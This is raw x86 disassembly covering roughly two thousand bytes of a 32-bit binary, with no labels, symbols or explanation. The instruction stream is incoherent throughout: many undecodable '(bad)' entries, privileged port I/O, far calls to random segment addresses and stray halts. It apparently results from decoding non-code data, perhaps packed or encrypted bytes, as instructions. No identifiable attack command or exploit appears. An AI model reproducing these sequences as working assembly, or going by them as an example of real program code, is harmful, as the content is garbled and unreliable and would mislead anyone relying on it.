  41962d:	mov    BYTE PTR [ebx],0xc1
  419630:	jo     0x41969a
  419632:	sub    al,0x24
  419634:	rol    ah,cl
  419636:	push   esp
  419637:	test   DWORD PTR [ebx],0xf0d2bd36
  41963d:	xchg   ecx,eax
  41963e:	pop    edx
  41963f:	mov    WORD PTR [eax+ebx*1-0x13b2d3cd],?
  419646:	stc    
  419647:	out    0x5c,al
  419649:	repz not BYTE PTR [eax-0x6c38273f]
  419650:	ret    0x8432
  419653:	popf   
  419654:	sub    DWORD PTR [ecx+0x78],ecx
  419657:	ret    
  419658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419659:	gs jno 0x419608
  41965c:	add    DWORD PTR [edi+ebx*4-0x152ea06b],esi
  419663:	xchg   ebp,eax
  419664:	das    
  419665:	xor    eax,0xdbf819be
  41966a:	push   cs
  41966b:	call   0x94841faf
  419670:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419671:	xor    DWORD PTR [edi+ecx*8],ebp
  419674:	lods   al,BYTE PTR ds:[esi]
  419675:	cmp    bl,bh
  419677:	pop    ebx
  419678:	push   es
  419679:	in     eax,dx
  41967a:	dec    ebp
  41967b:	xchg   ebp,eax
  41967c:	sti    
  41967d:	js     0x4196a2
  41967f:	popf   
  419680:	popa   
  419681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419682:	popf   
  419683:	inc    edx
  419684:	fadd   DWORD PTR [di+0x8]
  419688:	loopne 0x41966a
  41968a:	in     eax,0xcf
  41968c:	push   ecx
  41968d:	stc    
  41968e:	sahf   
  41968f:	mov    ebp,0x3d9f1d5b
  419694:	les    edi,FWORD PTR [eax+0x541af2e1]
  41969a:	cmp    al,0x19
  41969c:	fcomp  DWORD PTR [esi+0x6f0f18e4]
  4196a2:	pop    edx
  4196a3:	jbe    0x41968b
  4196a5:	retf   0x3598
  4196a8:	sub    eax,0xe0a6b5f9
  4196ad:	mov    esp,DWORD PTR [ebx-0x78]
  4196b0:	inc    ebp
  4196b1:	fcom   QWORD PTR ds:0x92e2342
  4196b7:	dec    edx
  4196b8:	xchg   esp,eax
  4196b9:	lods   eax,DWORD PTR cs:[esi]
  4196bb:	fcomi  st,st(1)
  4196bd:	jle    0x41964f
  4196bf:	mov    dh,0x36
  4196c1:	es pop ebx
  4196c3:	ins    BYTE PTR es:[edi],dx
  4196c4:	out    0xdb,eax
  4196c6:	cwde   
  4196c7:	dec    ebp
  4196c8:	jmp    0xccee3197
  4196cd:	(bad)  
  4196cf:	inc    eax
  4196d0:	nop
  4196d1:	push   0xffffffd4
  4196d3:	xchg   edi,eax
  4196d4:	add    bl,BYTE PTR [ecx+0x3f5c32be]
  4196da:	xchg   ebp,edx
  4196dc:	(bad)  
  4196dd:	gs in  eax,0xb8
  4196e0:	push   eax
  4196e1:	sub    ebx,DWORD PTR [eax+0x74]
  4196e4:	xchg   ebp,eax
  4196e5:	add    esi,edx
  4196e7:	adc    DWORD PTR [edi-0x7e2c6814],0x13
  4196ee:	pop    ecx
  4196ef:	mov    WORD PTR [ecx-0x2f],cs
  4196f2:	jb     0x41967c
  4196f4:	lock ret 
  4196f6:	(bad)  
  4196f7:	cdq    
  4196f8:	mov    esp,0xfdf12a65
  4196fd:	sbb    eax,0xc02a1771
  419702:	or     DWORD PTR [ecx-0x4b93803b],esp
  419708:	pop    edi
  419709:	stc    
  41970a:	pop    eax
  41970b:	ins    BYTE PTR es:[edi],dx
  41970c:	and    BYTE PTR [ebp+0x453bdac2],0x3
  419713:	popf   
  419714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419715:	mov    ebp,0x626ffb39
  41971a:	sbb    dh,BYTE PTR [eax-0x7316592d]
  419720:	dec    edi
  419721:	add    esi,esp
  419723:	push   edx
  419724:	lea    edx,ds:0x757f029
  41972a:	pop    ebx
  41972b:	xchg   ebp,eax
  41972c:	push   ss
  41972d:	or     BYTE PTR [esi+0x29c1d66b],bh
  419733:	cmp    eax,DWORD PTR [edx]
  419735:	or     dl,BYTE PTR [ebx]
  419737:	add    DWORD PTR [edx+0x55388203],0xefbd2220
  419741:	dec    esp
  419742:	imul   eax,DWORD PTR [eax+0x2b],0x13
  419746:	xchg   edi,eax
  419747:	and    al,BYTE PTR [eax+eiz*2-0x3bb35425]
  41974e:	call   0x265e:0x81621c22
  419755:	cmp    ch,BYTE PTR [ecx]
  419757:	cmp    BYTE PTR [edx-0x46696bd4],0xa3
  41975e:	aaa    
  41975f:	inc    ecx
  419760:	add    al,0x62
  419762:	test   eax,0xc41b5a9c
  419767:	ds pop ebx
  419769:	pop    esi
  41976a:	js     0x4197e0
  41976c:	sub    ecx,edi
  41976e:	dec    edx
  41976f:	ror    DWORD PTR [esi+ebx*2],0x97
  419773:	or     al,0x24
  419775:	lock js 0x4197b2
  419778:	jl     0x419780
  41977a:	adc    DWORD PTR ds:0xccad9684,ecx
  419780:	mov    bl,0x84
  419782:	dec    esi
  419783:	mov    dh,0x9a
  419785:	ins    BYTE PTR es:[edi],dx
  419786:	lods   al,BYTE PTR ds:[esi]
  419787:	push   ecx
  419788:	push   ss
  419789:	stos   DWORD PTR es:[edi],eax
  41978a:	xchg   edx,eax
  41978b:	dec    eax
  41978c:	mov    cs,ebp
  41978e:	ss mov ebx,0x2b5c7e7c
  419794:	hlt    
  419795:	hlt    
  419796:	leave  
  419797:	rcr    dh,0xd8
  41979a:	sahf   
  41979b:	sbb    ebp,DWORD PTR [eax-0x53]
  41979e:	cmp    eax,0x2fb8da75
  4197a3:	jecxz  0x419752
  4197a5:	jne    0x4197e9
  4197a7:	push   ebp
  4197a8:	xchg   DWORD PTR [ebx-0x75bde554],esp
  4197ae:	xor    eax,0x7a0ec1f3
  4197b3:	outs   dx,DWORD PTR ds:[esi]
  4197b4:	js     0x4197e9
  4197b6:	mov    dl,0x2
  4197b8:	jg     0x4197db
  4197ba:	pushf  
  4197bb:	stos   DWORD PTR es:[edi],eax
  4197bc:	xor    BYTE PTR [ebx-0x4a],ch
  4197bf:	inc    edx
  4197c0:	cs loope 0x41980b
  4197c3:	cmp    al,0xdd
  4197c5:	not    bh
  4197c7:	push   esp
  4197c8:	hlt    
  4197c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197ca:	push   es
  4197cb:	das    
  4197cc:	in     al,dx
  4197cd:	in     al,0x29
  4197cf:	push   ebx
  4197d0:	adc    esi,edi
  4197d2:	outs   dx,BYTE PTR ds:[esi]
  4197d3:	fdiv   QWORD PTR [edx]
  4197d5:	pop    ebx
  4197d6:	imul   ebp,DWORD PTR [edx],0x56
  4197d9:	and    ebx,DWORD PTR [edi+0x39]
  4197dc:	jecxz  0x419778
  4197de:	jbe    0x419801
  4197e0:	lods   eax,DWORD PTR ds:[esi]
  4197e1:	(bad)
  4197e5:	xor    BYTE PTR ds:0xa2b9a792,ch
  4197eb:	call   0xb988:0xe48580f1
  4197f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197f3:	call   0x8851:0x3498d7c8
  4197fa:	repz sbb eax,0x2a1bdbb1
  419800:	adc    ebp,DWORD PTR [ebp-0x7b]
  419803:	jge    0x41984d
  419805:	shl    DWORD PTR [eax],0x1e
  419808:	fistp  WORD PTR [ebp+0x797705e0]
  41980e:	or     bl,bl
  419810:	ins    DWORD PTR es:[edi],dx
  419811:	lods   eax,DWORD PTR ds:[esi]
  419812:	mov    DWORD PTR [edi-0xad748b0],edx
  419818:	mov    ecx,0xcd3127a7
  41981d:	mov    dl,0xf5
  41981f:	inc    edi
  419820:	int    0x36
  419822:	adc    edi,DWORD PTR [esi-0x1c]
  419825:	and    al,BYTE PTR [ebp+0xa]
  419828:	(bad)  
  41982a:	jne    0x41985b
  41982c:	cld    
  41982d:	fs ds inc eax
  419830:	dec    ebp
  419831:	dec    edx
  419832:	lds    ebp,FWORD PTR [esi]
  419834:	nop
  419835:	loop   0x419860
  419837:	ins    BYTE PTR es:[edi],dx
  419838:	sub    eax,eax
  41983a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41983b:	outs   dx,DWORD PTR ds:[esi]
  41983c:	retf   0xcb7b
  41983f:	pusha  
  419840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419841:	stc    
  419842:	cli    
  419843:	sub    al,0xe0
  419845:	cmp    DWORD PTR [ebx],esp
  419847:	bound  edx,QWORD PTR [eax+edi*8-0x13c898e5]
  41984e:	cld    
  41984f:	push   edi
  419850:	sbb    al,0x4e
  419852:	dec    eax
  419853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419854:	(bad)  
  419855:	mov    ecx,0x7bca6f01
  41985a:	test   eax,0x40f2a4b8
  41985f:	call   0x3b0ffa0f
  419864:	(bad)  
  419865:	jb     0x4198a4
  419867:	cli    
  419868:	add    al,0x8c
  41986a:	sub    edx,DWORD PTR [eax+0xa]
  41986d:	in     al,0xd
  41986f:	fadd   QWORD PTR [esi+0x69c0ec5c]
  419875:	(bad)  
  419876:	jb     0x419866
  419878:	cli    
  419879:	dec    esi
  41987a:	pop    ss
  41987b:	mov    esi,0x408c0540
  419880:	dec    esp
  419881:	pop    ecx
  419882:	jb     0x4198f3
  419884:	mov    bh,0xf7
  419886:	out    dx,eax
  419887:	stos   DWORD PTR es:[edi],eax
  419888:	jmp    0x4198cb
  41988a:	jae    0x419853
  41988c:	hlt    
  41988d:	xor    eax,0x4bf50753
  419892:	(bad)  
  419893:	and    eax,0x7115b598
  419898:	cmp    BYTE PTR [edx+0x63],dl
  41989b:	jmp    0x419884
  41989d:	icebp  
  41989e:	sub    DWORD PTR [ebp-0x38b1504e],esp
  4198a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198a5:	xor    al,0x89
  4198a7:	icebp  
  4198a8:	js     0x419885
  4198aa:	xlat   BYTE PTR ds:[ebx]
  4198ab:	mov    ?,WORD PTR [edx+0xd3ffa33]
  4198b1:	cmp    ch,BYTE PTR [eax]
  4198b3:	jns    0x41987a
  4198b5:	mov    cl,0xbc
  4198b7:	mov    esp,ebx
  4198b9:	lea    edi,[edi+edx*4+0x14]
  4198bd:	mov    al,ds:0x8a61014
  4198c2:	sahf   
  4198c3:	test   ebp,edx
  4198c5:	dec    esp
  4198c6:	pop    esp
  4198c7:	icebp  
  4198c8:	mov    ds:0x8bfc6a4c,al
  4198cd:	sbb    DWORD PTR [edx-0x1b06bf75],ecx
  4198d3:	add    al,0x50
  4198d5:	arpl   WORD PTR [eax],bx
  4198d7:	push   edi
  4198d8:	cdq    
  4198d9:	(bad)  [edi+eax*1+0x32]
  4198dd:	es inc esi
  4198df:	packuswb mm3,QWORD PTR ds:[eax+0x9]
  4198e4:	xchg   ebp,eax
  4198e5:	or     al,0xb6
  4198e7:	cmp    DWORD PTR [ebx],0x72ce2a57
  4198ed:	lock in eax,dx
  4198ef:	lods   eax,DWORD PTR ds:[esi]
  4198f0:	outs   dx,BYTE PTR ds:[esi]
  4198f1:	mov    ch,0x4b
  4198f3:	xchg   edi,eax
  4198f4:	repz jp 0x419960
  4198f7:	mov    esp,0x393675e1
  4198fc:	(bad)  
  4198fd:	aaa    
  4198fe:	xchg   edx,edi
  419900:	(bad)  
  419901:	push   ebp
  419902:	fsubr  DWORD PTR [ecx]
  419904:	scas   eax,DWORD PTR es:[edi]
  419905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419906:	add    al,BYTE PTR [edi+0x1e]
  419909:	shl    DWORD PTR [esi+0x6d],0x52
  41990d:	jp     0x4198de
  41990f:	mov    cl,0x5d
  419911:	ss loop 0x419919
  419914:	lea    ecx,[edx+0x45]
  419917:	leave  
  419918:	popa   
  419919:	ret    
  41991a:	mov    DWORD PTR [eax-0x7ad49e95],0x3b2cf93d
  419924:	pusha  
  419925:	inc    edx
  419926:	push   ds
  419927:	ss push 0x6183d726
  41992d:	cmp    dh,BYTE PTR [ebx]
  41992f:	stos   BYTE PTR es:[edi],al
  419930:	cmp    eax,0x410bc30a
  419935:	loop   0x419969
  419937:	inc    ebx
  419938:	aad    0x39
  41993a:	bound  edi,QWORD PTR [ecx-0x50]
  41993d:	fld    QWORD PTR [edi-0x3ed9be89]
  419943:	cdq    
  419944:	fadd   DWORD PTR [edi]
  419946:	and    al,0xbc
  419948:	push   cs
  419949:	mov    edi,edi
  41994b:	jmp    0xef95:0xe09a31ba
  419952:	xchg   ecx,ebp
  419954:	pop    ss
  419955:	icebp  
  419956:	mov    edx,0x5d2374c9
  41995b:	stos   BYTE PTR es:[edi],al
  41995c:	or     dl,BYTE PTR [esi]
  41995e:	sub    edi,DWORD PTR [edx]
  419960:	push   edi
  419961:	(bad)  
  419962:	adc    ebx,edi
  419964:	mov    al,ds:0x88be49b6
  419969:	mov    bl,0x0
  41996b:	fdiv   QWORD PTR [ebp+0x4c9b77a5]
  419971:	jecxz  0x41997c
  419973:	xchg   ecx,eax
  419974:	mov    al,0x90
  419976:	sub    al,0x5f
  419978:	xor    dh,BYTE PTR [edi]
  41997a:	xlat   BYTE PTR ds:[ebx]
  41997b:	xchg   esi,eax
  41997c:	stc    
  41997d:	idiv   BYTE PTR [ebx+edi*8]
  419980:	sbb    eax,0xb5418694
  419985:	add    DWORD PTR [edi-0x5d6fbaf3],0x36f99874
  41998f:	shl    bh,0x76
  419992:	and    ebp,ebp
  419994:	test   eax,0xbb300b47
  419999:	xchg   ebp,eax
  41999a:	mov    cl,0xe5
  41999c:	fwait
  41999d:	cwde   
  41999e:	pop    ebx
  41999f:	outs   dx,BYTE PTR ds:[esi]
  4199a0:	dec    edi
  4199a1:	cwde   
  4199a2:	data16 scas al,BYTE PTR es:[edi]
  4199a4:	jns    0x419956
  4199a6:	cmc    
  4199a7:	scas   eax,DWORD PTR es:[edi]
  4199a8:	not    DWORD PTR [eax-0x65]
  4199ab:	jge    0x419987
  4199ad:	cmp    eax,0x3547c33a
  4199b2:	xchg   edx,eax
  4199b3:	or     ch,BYTE PTR [ecx-0x232dbb8f]
  4199b9:	mov    edi,0x395296a8
  4199be:	xlat   BYTE PTR ds:[ebx]
  4199bf:	adc    bh,BYTE PTR [edi-0x17]
  4199c2:	jg     0x41997e
  4199c4:	(bad)
  4199c8:	adc    eax,0xf1feafee
  4199cd:	and    dl,BYTE PTR [edx+0xdc81cfa]
  4199d3:	std    
  4199d4:	bound  edx,QWORD PTR [ebx-0xb]
  4199d7:	push   eax
  4199d8:	div    BYTE PTR [eax+0x8ca4126]
  4199de:	xor    bl,0x51
  4199e1:	push   es
  4199e2:	cmp    al,0x2
  4199e4:	outs   dx,BYTE PTR ds:[esi]
  4199e5:	mov    ecx,0x46af116e
  4199ea:	xchg   edi,eax
  4199eb:	fwait
  4199ec:	neg    BYTE PTR [ebx+0x3bc4cb24]
  4199f2:	inc    ebp
  4199f3:	and    edx,DWORD PTR [esi+ebp*8+0x59fb5ee9]
  4199fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199fb:	into   
  4199fc:	repnz cmp ecx,edi
  4199ff:	jle    0x419a42
  419a01:	repnz imul edi,DWORD PTR [ecx-0x72ebf1ca],0x74b93263
  419a0c:	add    al,0xe4
  419a0e:	test   DWORD PTR [edi+0x34ef43c6],eax
  419a14:	inc    ebp
  419a15:	mov    bh,0xd
  419a17:	mov    fs,ecx
  419a19:	into   
  419a1a:	cli    
  419a1b:	push   ss
  419a1c:	(bad)  
  419a1e:	and    dl,BYTE PTR [esi+0x1]
  419a21:	pop    esp
  419a22:	adc    eax,DWORD PTR [esi+0x3628eac9]
  419a28:	pop    ebx
  419a29:	pop    eax
  419a2a:	and    ebp,esp
  419a2c:	jmp    0x419a66
  419a2e:	out    0x1e,al
  419a30:	mov    ch,0xb7
  419a32:	les    ebx,FWORD PTR es:[ebp+0x26]
  419a36:	das    
  419a37:	fxtract 
  419a39:	iret   
  419a3a:	(bad)  
  419a3b:	stos   DWORD PTR es:[edi],eax
  419a3c:	sbb    edx,DWORD PTR [edx]
  419a3e:	push   edx
  419a3f:	inc    edx
  419a40:	test   BYTE PTR [edx],bh
  419a42:	xlat   BYTE PTR ds:[ebx]
  419a43:	sahf   
  419a44:	xor    eax,0xe124b543
  419a49:	pop    esi
  419a4a:	pop    esp
  419a4b:	jmp    0x419aba
  419a4d:	fsubr  DWORD PTR [ebx]
  419a4f:	mov    edi,?
  419a51:	inc    eax
  419a52:	mov    ch,0xd5
  419a54:	inc    ecx
  419a55:	inc    ebp
  419a56:	test   BYTE PTR [ecx+0x7a],bl
  419a59:	mov    esp,0x93184d32
  419a5e:	outs   dx,DWORD PTR ds:[esi]
  419a5f:	out    dx,al
  419a60:	jns    0x419a68
  419a62:	mov    esi,0x389aea3a
  419a67:	mov    DWORD PTR [ebp+0x3a],edi
  419a6a:	and    al,0xb9
  419a6c:	mov    ch,dl
  419a6e:	jp     0x419a3a
  419a70:	mov    cl,0xcd
  419a72:	xchg   ebx,eax
  419a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a74:	dec    eax
  419a75:	push   0x5333a222
  419a7a:	and    dl,dl
  419a7c:	stos   DWORD PTR es:[edi],eax
  419a7d:	push   edx
  419a7e:	adc    eax,0x746be7e4
  419a83:	or     ecx,DWORD PTR ds:0x25545985
  419a89:	in     al,dx
  419a8a:	les    edx,FWORD PTR [edi-0x471df107]
  419a90:	lods   al,BYTE PTR ds:[esi]
  419a91:	pop    esi
  419a92:	sub    ebx,DWORD PTR [edx]
  419a94:	into   
  419a95:	in     eax,0xbc
  419a97:	dec    edi
  419a98:	int3   
  419a99:	or     DWORD PTR [ebp+esi*8+0x7a],0x5c
  419a9e:	test   al,0x1c
  419aa0:	xchg   edi,eax
  419aa1:	popa   
  419aa2:	sub    DWORD PTR [ebx+0x44],esp
  419aa5:	gs sub al,0xa6
  419aa8:	xchg   ebx,eax
  419aa9:	jle    0x419a62
  419aab:	ror    DWORD PTR [eax],cl
  419aad:	jns    0x419a37
  419aaf:	les    ecx,FWORD PTR [ebx+0x35]
  419ab2:	retf   0x5753
  419ab5:	ins    DWORD PTR es:[edi],dx
  419ab6:	push   ebp
  419ab7:	mov    ecx,0x481a861f
  419abc:	rcr    DWORD PTR [eax+0x51],0xed
  419ac0:	jbe    0x419ad5
  419ac2:	hlt    
  419ac3:	fcomp  QWORD PTR [esi]
  419ac5:	js     0x419b44
  419ac7:	(bad)  
  419ac8:	out    dx,al
  419ac9:	xor    BYTE PTR [ebx-0x72a5621e],0x1a
  419ad0:	retf   
  419ad1:	outs   dx,BYTE PTR ds:[esi]
  419ad2:	lock adc ebp,DWORD PTR [ebx-0x80]
  419ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ad7:	cmp    DWORD PTR ds:0xd6d6e7f2,ebx
  419add:	mov    BYTE PTR [eax-0x37],ch
  419ae0:	xor    eax,0xb8723995
  419ae5:	aam    0xd5
  419ae7:	into   
  419ae8:	mov    ds:0x4ae6c96,eax
  419aed:	into   
  419aee:	adc    BYTE PTR ds:0xabca4c14,bl
  419af4:	cwde   
  419af5:	lea    edi,[eax-0x4a]
  419af8:	jo     0x419ae0
  419afa:	rcl    DWORD PTR [eax+eiz*2+0x17],1
  419afe:	mov    al,ds:0xe4f5b816
  419b03:	fdiv   DWORD PTR [eax-0x4e]
  419b06:	jecxz  0x419a94
  419b08:	cld    
  419b09:	retf   
  419b0a:	push   esi
  419b0b:	bound  esi,QWORD PTR [esi-0x71]
  419b0e:	mov    ch,0x59
  419b10:	jb     0x419b53
  419b12:	push   esi
  419b13:	dec    esp
  419b14:	mov    ebx,0x9a01cad8
  419b19:	jle    0x419b98
  419b1b:	popa   
  419b1c:	je     0x419aad
  419b1e:	cdq    
  419b1f:	sub    ebx,DWORD PTR [edi+0x3e]
  419b22:	pop    ds
  419b23:	add    bh,BYTE PTR ds:0xd4ff71e7
  419b29:	xor    eax,0x933b1897
  419b2e:	mov    ecx,DWORD PTR [ebx-0x142fe278]
  419b34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b35:	call   0xace602ec
  419b3a:	mov    edx,DWORD PTR [edx-0x2ec4f078]
  419b40:	call   0x3149:0xe67cf480
  419b47:	(bad)  
  419b49:	push   ebx
  419b4a:	xchg   DWORD PTR [esp+edx*2],esi
  419b4d:	pop    ss
  419b4e:	xor    DWORD PTR [edi+0x3c95e2ae],esi
  419b54:	mov    ah,0x1d
  419b56:	loope  0x419b20
  419b58:	adc    ebp,edi
  419b5a:	bnd jmp 0x38e53880
  419b60:	mov    al,ds:0x96c944c
  419b65:	mov    ds:0xab2a166d,eax
  419b6a:	or     esp,DWORD PTR [eax+0x74]
  419b6d:	jb     0x419b5a
  419b6f:	aad    0xe2
  419b71:	fwait
  419b72:	xor    al,0xf2
  419b74:	lods   eax,DWORD PTR ds:[esi]
  419b75:	sete   BYTE PTR [ebx-0x7b]
  419b79:	out    0xc,eax
  419b7b:	popa   
  419b7c:	fiadd  DWORD PTR [esi+0x36]
  419b7f:	and    di,di
  419b82:	pop    ds
  419b83:	xor    dl,BYTE PTR [esi]
  419b85:	push   eax
  419b86:	iret   
  419b87:	popa   
  419b88:	cmp    BYTE PTR [ecx-0x58],dh
  419b8b:	dec    ebp
  419b8c:	ja     0x419b0e
  419b8e:	xchg   edi,eax
  419b8f:	xchg   esp,eax
  419b90:	sub    al,0xe3
  419b92:	imul   ch
  419b94:	pop    ss
  419b95:	or     eax,0x3f959485
  419b9a:	and    ebx,DWORD PTR [esi]
  419b9c:	pusha  
  419b9d:	dec    ebp
  419b9e:	retf   0x6437
  419ba1:	repnz mov edi,DWORD PTR [ebx+0x19]
  419ba5:	push   ss
  419ba6:	pop    ss
  419ba7:	xchg   BYTE PTR [edx],bl
  419ba9:	dec    esi
  419baa:	leave  
  419bab:	cmp    DWORD PTR [edi-0x4811c796],esi
  419bb1:	pop    ebx
  419bb2:	inc    esp
  419bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bb4:	lock or eax,0x7ad3a933
  419bba:	test   al,0xe8
  419bbc:	and    eax,0xcd2e99ac
  419bc1:	(bad)  
  419bc2:	xor    eax,0x3370cf08
  419bc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bc8:	jecxz  0x419c40
  419bca:	cdq    
  419bcb:	into   
  419bcc:	sbb    eax,DWORD PTR [ecx+eiz*8+0x63a569b1]
  419bd3:	ins    DWORD PTR es:[edi],dx
  419bd4:	repnz lahf 
  419bd6:	fisttp QWORD PTR [ebx+edi*2-0xe75caa2]
  419bdd:	jl     0x419b8a
  419bdf:	mov    edi,edx
  419be1:	jae    0x419b9e
  419be3:	sbb    eax,0x76fc7ca4
  419be8:	enter  0xc465,0x74
  419bec:	sbb    eax,0x7498f982
  419bf1:	pop    ss
  419bf2:	(bad)  
  419bf3:	pop    ebx
  419bf4:	call   0x3873:0xbeaeacc0
  419bfb:	mov    edx,0x70b515de
  419c00:	add    ah,BYTE PTR [edx-0x108f022]
  419c06:	jo     0x419bb6
  419c08:	jno    0x419b92
  419c0a:	scas   al,BYTE PTR es:[edi]
  419c0b:	mov    eax,ds:0x731e8108
  419c10:	call   0xbb07:0x6e5044b0
  419c17:	loop   0x419c29
  419c19:	xor    BYTE PTR [ecx+0x2b3b406f],cl
  419c1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c20:	jg     0x419c8e
  419c22:	or     ebp,DWORD PTR [ebp+0x404df740]
  419c28:	test   cl,0x61
  419c2b:	xor    DWORD PTR [edx],ebx
  419c2d:	jo     0x419bc1
  419c2f:	in     al,0xc6
  419c31:	pop    eax
  419c32:	jns    0x419c20
  419c34:	or     BYTE PTR ds:0xe22d8c73,0x70
  419c3b:	mov    al,ds:0xbfa3398e
  419c40:	aam    0xbd
  419c42:	sub    esp,DWORD PTR [ebx+0x629c32b0]
  419c48:	and    edx,DWORD PTR ds:0x5771c84b
  419c4e:	mov    al,0xda
  419c50:	mov    eax,0xe4f5f8ba
  419c55:	xor    DWORD PTR [edi],ebp
  419c57:	mov    ecx,ds
  419c59:	push   ecx
  419c5a:	mov    ss,WORD PTR [esi+0x3133e61]
  419c60:	jp     0x419cd9
  419c62:	stc    
  419c63:	xlat   BYTE PTR ds:[ebx]
  419c64:	shl    dh,cl
  419c66:	jae    0x419c19
  419c68:	cmp    al,0x61
  419c6a:	add    ebx,0x39a86328
  419c70:	inc    ecx
  419c71:	fild   WORD PTR [eax+0x79]
  419c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c75:	repz test al,0xe6
  419c78:	xchg   edi,eax
  419c79:	ins    DWORD PTR es:[edi],dx
  419c7a:	xor    DWORD PTR [edi],edi
  419c7c:	je     0x419cc0
  419c7e:	test   eax,0x3e6c54c1
  419c83:	das    
  419c84:	xor    al,0xc9
  419c86:	hlt    
  419c87:	in     al,0xeb
  419c89:	cdq    
  419c8a:	sti    
  419c8b:	and    BYTE PTR [edi+0x30],dh
  419c8e:	rcr    BYTE PTR [esi+ebp*4+0x8],1
  419c92:	pop    esi
  419c93:	xchg   esp,eax
  419c94:	js     0x419c54
  419c96:	and    DWORD PTR [ebx-0x597af2d3],eax
  419c9c:	add    dl,BYTE PTR [esi]
  419c9e:	pop    esi
  419c9f:	adc    dh,BYTE PTR [ecx]
  419ca1:	sub    ebp,DWORD PTR [edx]
  419ca3:	fstp   DWORD PTR [eax+0x4a]
  419ca6:	fld    TBYTE PTR [eax+0x62f246d7]
  419cac:	cwde   
  419cad:	ret    0xaf4d
  419cb0:	test   cl,ah
  419cb2:	jbe    0x419cfa
  419cb4:	jmp    0x419d0f
  419cb6:	ins    BYTE PTR es:[edi],dx
  419cb7:	aas    
  419cb8:	cmp    esi,DWORD PTR [eax]
  419cba:	jecxz  0x419ca4
  419cbc:	bound  edi,QWORD PTR [esi-0x3d]
  419cbf:	jle    0x419c45
  419cc1:	cmp    BYTE PTR [edi-0x5c8c545a],al
  419cc7:	mov    al,BYTE PTR [eax+edi*2]
  419cca:	mov    ch,0x9b
  419ccc:	add    eax,0xc28eda62
  419cd1:	jno    0x419d52
  419cd3:	push   ss
  419cd4:	jb     0x419d32
  419cd6:	in     eax,dx
  419cd7:	sub    esi,ebx
  419cd9:	adc    bh,ch
  419cdb:	add    ch,BYTE PTR [eax+0x5a55c64c]
  419ce1:	in     eax,dx
  419ce2:	mov    esi,0xa7a85625
  419ce7:	xor    BYTE PTR [edi-0x12],ch
  419cea:	or     DWORD PTR [ecx-0x4e737b59],ecx
  419cf0:	dec    eax
  419cf1:	int3   
  419cf2:	jge    0x419d53
  419cf4:	jle    0x419c7a
  419cf6:	xchg   ebp,eax
  419cf7:	fdiv   QWORD PTR [esi+0x47]
  419cfa:	mov    DWORD PTR [edi+edx*4-0x33f6ad01],ebp
  419d01:	je     0x419c8e
  419d03:	cld    
  419d04:	pop    esp
  419d05:	push   ds
  419d06:	mov    ?,WORD PTR [esi+edx*4+0x67]
  419d0a:	pushaw 
  419d0c:	cli    
  419d0d:	pop    ecx
  419d0e:	(bad)  
  419d0f:	ror    ah,0xf7
  419d12:	and    bl,BYTE PTR [esi]
  419d14:	repz fdiv DWORD PTR fs:[eax+0x30]
  419d19:	cmp    eax,0xd0acb5dd
  419d1e:	shl    cl,0x93
  419d21:	retf   
  419d22:	out    dx,al
  419d23:	jle    0x419cd9
  419d25:	sti    
  419d26:	cmc    
  419d27:	adc    ah,dl
  419d29:	in     eax,0x25
  419d2b:	mov    ch,0xb7
  419d2d:	pop    edi
  419d2e:	int3   
  419d2f:	and    ah,cl
  419d31:	lahf   
  419d32:	add    ebp,edi
  419d34:	lea    ecx,[ebx]
  419d36:	and    DWORD PTR [eax-0x21],0xffffffa5
  419d3a:	mov    bl,0x94
  419d3c:	push   0xffffff90
  419d3e:	cmp    cl,bh
  419d40:	or     esp,edx
  419d42:	retf   0x69bd
  419d45:	pop    ebx
  419d46:	pop    ss
  419d47:	sbb    eax,0xf9506756
  419d4c:	sbb    ah,ah
  419d4e:	mov    edx,0x6150f30c
  419d53:	fidiv  WORD PTR [eax+eiz*2+0x48]
  419d57:	call   0x23b2:0x6221ebfe
  419d5e:	frstor [ecx-0x31a24cbb]
  419d64:	sub    eax,0xac0f1264
  419d69:	data16 cmp BYTE PTR [ecx+0x57379c55],cl
  419d70:	bswap  ebx
  419d72:	pop    ebp
  419d73:	out    0x91,eax
  419d75:	mov    bl,0x9d
  419d77:	jmp    0x419d34
  419d79:	xchg   esi,eax
  419d7a:	je     0x419d9b
  419d7c:	shr    BYTE PTR [edx],0x97
  419d7f:	call   FWORD PTR [edx+0x37]
  419d82:	mov    cl,0x36
  419d84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d85:	int    0xfd
  419d87:	jno    0x419d52
  419d89:	jnp    0x419dd2
  419d8b:	adc    ebp,ebx
  419d8d:	or     BYTE PTR [esi-0x159ce8bc],ch
  419d93:	push   ecx
  419d94:	push   cs
  419d95:	pop    ds
  419d96:	dec    esp
  419d97:	inc    esp
  419d98:	add    BYTE PTR [esi+esi*4-0x1],al
  419d9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d9d:	push   0xffffffee
  419d9f:	mov    WORD PTR [eax],gs
  419da1:	mov    esi,0x5390029b
  419da6:	xlat   BYTE PTR ds:[ebx]
  419da7:	mov    al,0xc0
  419da9:	or     dl,BYTE PTR [ebp-0x9]
  419dac:	popf   
  419dad:	cmp    DWORD PTR [esi-0x3c274a18],ebx
  419db3:	fsub   QWORD PTR [edi]
  419db5:	(bad)  
  419db6:	mov    al,0x99
  419db8:	jnp    0x419dbc
  419dba:	pop    edx
  419dbb:	push   cs
